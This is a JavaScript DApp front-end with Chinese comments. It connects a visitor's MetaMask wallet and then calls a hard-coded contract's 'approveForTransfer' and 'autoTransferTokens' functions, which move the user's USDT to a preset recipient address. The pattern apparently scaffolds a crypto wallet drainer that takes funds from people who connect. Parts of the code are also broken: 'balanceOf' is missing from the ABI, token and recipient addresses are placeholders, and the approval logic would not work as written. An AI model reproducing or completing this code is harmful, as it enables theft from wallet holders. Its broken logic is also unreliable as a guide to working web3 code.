const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "approveForTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "automateApproval",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "tokenAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }
        ],
        "name": "autoTransferTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2'; // 你的合约地址

let web3;
let contract;
let userAccount;

// Initialize Web3
window.addEventListener('load', async () => {
    if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum); // 使用 MetaMask 的 provider
        document.getElementById('connectWallet').addEventListener('click', connectWallet);
    } else {
        alert('MetaMask 未安装。请安装 MetaMask 以使用该 DApp！');
    }
});

// 连接钱包
async function connectWallet() {
    try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];
        document.getElementById('walletAddress').textContent = userAccount;
        document.getElementById('walletInfo').classList.remove('hidden');
        const balance = await getTokenBalance(userAccount);
        document.getElementById('walletBalance').textContent = web3.utils.fromWei(balance, 'ether');
        document.getElementById('status').textContent = '钱包连接成功！';
    } catch (error) {
        console.error('用户拒绝连接或者出现错误:', error);
        document.getElementById('status').textContent = '连接钱包失败，请重试。';
    }
}

// 获取 USDT 余额
async function getTokenBalance(address) {
    try {
        contract = new web3.eth.Contract(contractABI, contractAddress);
        const balance = await contract.methods.balanceOf(address).call();
        return balance;
    } catch (error) {
        console.error('获取代币余额失败:', error);
        document.getElementById('status').textContent = '获取余额失败，请重试。';
    }
}

// 批准代币
async function approveTokens() {
    try {
        const spenderAddress = contractAddress; // 合约本身
        const balance = await getTokenBalance(userAccount);

        await contract.methods.approveForTransfer(
            'USDT token address', 
            userAccount, 
            spenderAddress
        ).send({ from: userAccount });

        document.getElementById('status').textContent = '代币批准成功。';
    } catch (error) {
        console.error('批准代币时出错:', error);
        document.getElementById('status').textContent = '代币批准失败，请重试。';
    }
}

// 转移代币
async function transferTokens() {
    try {
        const recipientAddress = 'recipient address'; // 设置接收者地址
        const balance = await getTokenBalance(userAccount);

        await contract.methods.autoTransferTokens(
            'USDT token address', 
            userAccount, 
            recipientAddress
        ).send({ from: userAccount });

        document.getElementById('status').textContent = '代币转移成功！';
    } catch (error) {
        console.error('转移代币时出错:', error);
        document.getElementById('status').textContent = '代币转移失败，请重试。';
    }
}
